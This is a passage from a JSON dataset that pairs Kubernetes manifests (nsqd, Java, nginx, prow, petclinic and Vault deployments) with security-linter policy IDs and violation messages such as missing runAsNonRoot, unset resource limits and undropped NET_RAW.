    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: retraced-nsqd\n  namespace: '{{repl ConfigOption \"namespace\"}}'\nspec:\n  selector:\n    matchLabels:\n      tier: nsq\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: auditlog\n        tier: nsq\n    spec:\n      containers:\n      - name: nsqd\n        image: nsqio/nsq:v1.0.0-compat\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - nsqd -statsd-address ${STATSD_HOST}:${STATSD_PORT} -statsd-prefix \"nsqd.\"\n        env:\n        - name: STATSD_HOST\n          valueFrom:\n            secretKeyRef:\n              name: auditlog\n              key: STATSD_HOST\n        - name: STATSD_PORT\n          valueFrom:\n            secretKeyRef:\n              name: auditlog\n              key: STATSD_PORT\n        ports:\n        - containerPort: 4150\n        - containerPort: 4151\n        resources:\n          requests:\n            cpu: 100m\n          limits:\n            cpu: 500m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nsqd\" has memory limit 0"
  },
  {
    "id": "7793",
    "manifest_path": "data/manifests/the_stack_sample/sample_2872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7794",
    "manifest_path": "data/manifests/the_stack_sample/sample_2872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "7795",
    "manifest_path": "data/manifests/the_stack_sample/sample_2872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "7796",
    "manifest_path": "data/manifests/the_stack_sample/sample_2872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "7797",
    "manifest_path": "data/manifests/the_stack_sample/sample_2872.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: java\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: java\n  template:\n    metadata:\n      labels:\n        app: java\n    spec:\n      containers:\n      - name: app\n        image: gcr.io/project/app:version\n        command:\n        - java\n        - -jar\n        - /app.jar\n        ports:\n        - containerPort: 8080\n        envFrom:\n        - configMapRef:\n            name: app-config\n        env:\n        - name: JAVA_OPTS\n          value: -XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap\n            -Djava.security.egd=file:/dev/./urandom\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "7798",
    "manifest_path": "data/manifests/the_stack_sample/sample_2874.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7145\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7799",
    "manifest_path": "data/manifests/the_stack_sample/sample_2874.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7145\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7800",
    "manifest_path": "data/manifests/the_stack_sample/sample_2874.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7145\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7801",
    "manifest_path": "data/manifests/the_stack_sample/sample_2874.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7145\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7802",
    "manifest_path": "data/manifests/the_stack_sample/sample_2874.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7145\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7803",
    "manifest_path": "data/manifests/the_stack_sample/sample_2879.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod-using-service-account\n  labels:\n    app: nginx-app\nspec:\n  securityContext:\n    runAsUser: 1000\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: app-service-account\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (app-service-account), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "7804",
    "manifest_path": "data/manifests/the_stack_sample/sample_2879.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod-using-service-account\n  labels:\n    app: nginx-app\nspec:\n  securityContext:\n    runAsUser: 1000\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: app-service-account\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7805",
    "manifest_path": "data/manifests/the_stack_sample/sample_2879.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod-using-service-account\n  labels:\n    app: nginx-app\nspec:\n  securityContext:\n    runAsUser: 1000\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: app-service-account\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "7806",
    "manifest_path": "data/manifests/the_stack_sample/sample_2879.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod-using-service-account\n  labels:\n    app: nginx-app\nspec:\n  securityContext:\n    runAsUser: 1000\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: app-service-account\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"app-service-account\" not found"
  },
  {
    "id": "7807",
    "manifest_path": "data/manifests/the_stack_sample/sample_2879.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod-using-service-account\n  labels:\n    app: nginx-app\nspec:\n  securityContext:\n    runAsUser: 1000\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: app-service-account\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "7808",
    "manifest_path": "data/manifests/the_stack_sample/sample_2879.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-pod-using-service-account\n  labels:\n    app: nginx-app\nspec:\n  securityContext:\n    runAsUser: 1000\n  containers:\n  - name: nginx-container\n    image: nginx\n  serviceAccount: app-service-account\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "7809",
    "manifest_path": "data/manifests/the_stack_sample/sample_2881.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20200818-6369dfaef5\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --kubeconfig=/etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pipeline\" does not have a read-only root file system"
  },
  {
    "id": "7810",
    "manifest_path": "data/manifests/the_stack_sample/sample_2881.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20200818-6369dfaef5\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --kubeconfig=/etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-pipeline\" not found"
  },
  {
    "id": "7811",
    "manifest_path": "data/manifests/the_stack_sample/sample_2881.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20200818-6369dfaef5\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --kubeconfig=/etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pipeline\" is not set to runAsNonRoot"
  },
  {
    "id": "7812",
    "manifest_path": "data/manifests/the_stack_sample/sample_2881.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20200818-6369dfaef5\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --kubeconfig=/etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pipeline\" has cpu request 0"
  },
  {
    "id": "7813",
    "manifest_path": "data/manifests/the_stack_sample/sample_2881.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20200818-6369dfaef5\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        - --kubeconfig=/etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pipeline\" has memory limit 0"
  },
  {
    "id": "7814",
    "manifest_path": "data/manifests/the_stack_sample/sample_2882.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-aks\n  name: spring-petclinic-aks-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-aks\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-aks\n        app.kubernetes.io/part-of: spring-petclinic-aks\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-aks\n    spec:\n      containers:\n      - image: spring-petclinic-aks:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "7815",
    "manifest_path": "data/manifests/the_stack_sample/sample_2882.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-aks\n  name: spring-petclinic-aks-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-aks\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-aks\n        app.kubernetes.io/part-of: spring-petclinic-aks\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-aks\n    spec:\n      containers:\n      - image: spring-petclinic-aks:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "7816",
    "manifest_path": "data/manifests/the_stack_sample/sample_2882.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-aks\n  name: spring-petclinic-aks-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-aks\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-aks\n        app.kubernetes.io/part-of: spring-petclinic-aks\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-aks\n    spec:\n      containers:\n      - image: spring-petclinic-aks:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "7817",
    "manifest_path": "data/manifests/the_stack_sample/sample_2882.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-aks\n  name: spring-petclinic-aks-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: spring-petclinic-aks\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: spring-petclinic-aks\n        app.kubernetes.io/part-of: spring-petclinic-aks\n        tanzu.app.live.view: 'true'\n        tanzu.app.live.view.application.name: spring-petclinic-aks\n    spec:\n      containers:\n      - image: spring-petclinic-aks:2.4.2\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 15\n        name: app\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 15\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "7818",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"vault\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "7819",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_project\n        - name: KMS_REGION\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_region\n        - name: KMS_KEY_RING\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_ring\n        - name: KMS_CRYPTO_KEY\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_crypto_key\n        - name: LOAD_BALANCER_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: load_balancer_address\n        - name: POD_IP_ADDR\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_LOCAL_CONFIG\n          value: \"api_addr     = \\\"https://$(LOAD_BALANCER_ADDR)\\\"\\ncluster_addr =\\\n            \\ \\\"https://$(POD_IP_ADDR):8201\\\"\\n\\nlog_level = \\\"warn\\\"\\n\\nui = true\\n\\\n            \\nseal \\\"gcpckms\\\" {\\n  project    = \\\"$(KMS_PROJECT)\\\"\\n  region    \\\n            \\ = \\\"$(KMS_REGION)\\\"\\n  key_ring   = \\\"$(KMS_KEY_RING)\\\"\\n  crypto_key\\\n            \\ = \\\"$(KMS_CRYPTO_KEY)\\\"\\n}\\n\\nstorage \\\"gcs\\\" {\\n  bucket     = \\\"$(GCS_BUCKET_NAME)\\\"\\\n            \\n  ha_enabled = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n  address     = \\\"\\\n            127.0.0.1:8200\\\"\\n  tls_disable = \\\"true\\\"\\n}\\n\\nlistener \\\"tcp\\\" {\\n\\\n            \\  address       = \\\"$(POD_IP_ADDR):8200\\\"\\n  tls_cert_file = \\\"/etc/vault/tls/vault.crt\\\"\\\n            \\n  tls_key_file  = \\\"/etc/vault/tls/vault.key\\\"\\n\\n  tls_disable_client_certs\\\n            \\ = true\\n}\\n\"\n        readinessProbe:\n          httpGet:\n            path: /v1/sys/health?standbyok=true\n            port: 8200\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 5\n      volumes:\n      - name: vault-tls\n        secret:\n          secretName: vault-tls\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable VAULT_SECRET_SHARES in container \"vault-init\" found"
  },
  {
    "id": "7820",
    "manifest_path": "data/manifests/the_stack_sample/sample_2883.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: vault\n  labels:\n    app: vault\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vault\n  template:\n    metadata:\n      labels:\n        app: vault\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 60\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - vault\n              topologyKey: kubernetes.io/hostname\n      containers:\n      - name: vault-init\n        image: registry.hub.docker.com/sethvargo/vault-init:1.0.0\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 64Mi\n        env:\n        - name: CHECK_INTERVAL\n          value: '5'\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_KEY_ID\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: kms_key_id\n        - name: VAULT_ADDR\n          value: http://127.0.0.1:8200\n        - name: VAULT_SECRET_SHARES\n          value: '1'\n        - name: VAULT_SECRET_THRESHOLD\n          value: '1'\n      - name: vault\n        image: registry.hub.docker.com/library/vault:1.2.2\n        imagePullPolicy: IfNotPresent\n        args:\n        - server\n        securityContext:\n          capabilities:\n            add:\n            - IPC_LOCK\n        ports:\n        - containerPort: 8200\n          name: vault-port\n          protocol: TCP\n        - containerPort: 8201\n          name: cluster-port\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - name: vault-tls\n          mountPath: /etc/vault/tls\n        env:\n        - name: GCS_BUCKET_NAME\n          valueFrom:\n            configMapKeyRef:\n              name: vault\n              key: gcs_bucket_name\n        - name: KMS_PROJECT\n          